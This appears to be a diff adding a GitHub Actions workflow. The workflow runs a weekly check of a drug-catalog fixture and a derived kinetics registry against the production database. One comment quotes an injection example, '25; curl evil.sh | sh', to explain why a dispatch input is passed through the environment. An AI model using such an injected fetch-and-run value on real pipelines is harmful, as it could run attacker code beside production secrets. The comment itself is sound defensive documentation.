@@ -1,0 +1,97 @@
+name: catalog-drift
+
+# `data/components.ts` is a hand-maintained snapshot that nothing kept current.
+# `scripts/seed-drugs.ts` pushes it INTO the database; every other write path —
+# the /review pending-edit queue, parameter_entries aggregation, the
+# deep-research importer, the scheduled maintainer agents — writes only to the
+# database. So the fixture drifts, silently, and two things quietly rot with it:
+# the offline fallback `src/data/index.ts` serves when GET /api/drugs is
+# unreachable, and the reviewed catalog the kinetics-core provenance gate
+# measures the pinned registry against.
+#
+# This job is the smoke alarm. It reads the live catalog and reports how far the
+# fixture has fallen behind. Fix a failure with `npm run catalog:export` (then
+# re-run `npm run kinetics:provenance:check` — a refreshed catalog can move the
+# registry cross-check).
+#
+# Scheduled rather than per-PR: drift comes from database writes, which leave no
+# trace in the repo, so there is no diff to trigger on. The PR-time half of the
+# contract is `catalog-sync.yml`, which runs the exporter's unit + integration
+# tests on every change to the exporter or the fixture.
+#
+# `src/lib/kinetics-core/generated-registry.ts` is the second artifact derived
+# from that same catalog, and until now nothing watched it on a schedule. Its
+# only check lived in `kinetics-core.yml`, behind a path filter listing the
+# engine sources — none of which a database write touches. So the check ran
+# only when someone happened to edit the engine, and between 2 and 16 September
+# nothing did: the artifact went stale for a fortnight and was discovered by
+# accident, when an unrelated edit to that workflow file triggered it.
+#
+# Both artifacts rot from the same cause and are refreshed by the same kind of
+# command, so they share one weekly alarm rather than two. Fix a registry
+# failure with `npm run kinetics:registry`; review the regenerated file as data,
+# because it is a snapshot of what the catalog currently says.
+on:
+  schedule:
+    # Mondays 06:00 UTC — one report a week, at the start of the working week.
+    - cron: '0 6 * * 1'
+  workflow_dispatch:
+    inputs:
+      max_drifts:
+        description: 'Max per-drug drift rows to print'
+        required: false
+        default: '25'
+
+jobs:
+  catalog-drift:
+    runs-on: ubuntu-latest
+    # Hang guard only; the drift report finishes in ~1 min.
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: 'npm'
+      - name: Install deps
+        run: npm ci
+
+      # The check needs read access to the production catalog. Without the
+      # secret there is nothing to compare against — skip with a notice rather
+      # than failing, so a fork or a repo that has not configured the secret
+      # does not show a permanently red scheduled job.
+      - name: Check DATABASE_URL is configured
+        id: guard
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+        run: |
+          if [ -z "$DATABASE_URL" ]; then
+            echo "::notice::DATABASE_URL secret is not set — skipping the catalog drift check."
+            echo "configured=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "configured=true" >> "$GITHUB_OUTPUT"
+          fi
+
+      # MAX_DRIFTS goes through the environment, never string-interpolated into
+      # the `run` script. A `${{ }}` expression is substituted before the shell
+      # ever sees it, so a dispatch input of `25; curl evil.sh | sh` would run
+      # as shell in a step holding the production DATABASE_URL. Via env + quotes
+      # the value stays a single argument and the CLI's own integer validation
+      # rejects anything malformed.
+      - name: Catalog drift check
+        if: steps.guard.outputs.configured == 'true'
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+          MAX_DRIFTS: ${{ github.event.inputs.max_drifts || '25' }}
+        run: npx tsx scripts/export-components.ts --check --max-drifts "$MAX_DRIFTS"
+
+      # `always()` so a stale fixture does not hide a stale registry. These are
+      # two independent artifacts with two different remedies, and a week where
+      # both have drifted should say so in one report rather than reveal the
+      # second only after the first is fixed. The job still fails if either
+      # check does.
+      - name: Derived registry drift check
+        if: always() && steps.guard.outputs.configured == 'true'
+        env:
+          DATABASE_URL: ${{ secrets.DATABASE_URL }}
+        run: npm run kinetics:registry:check
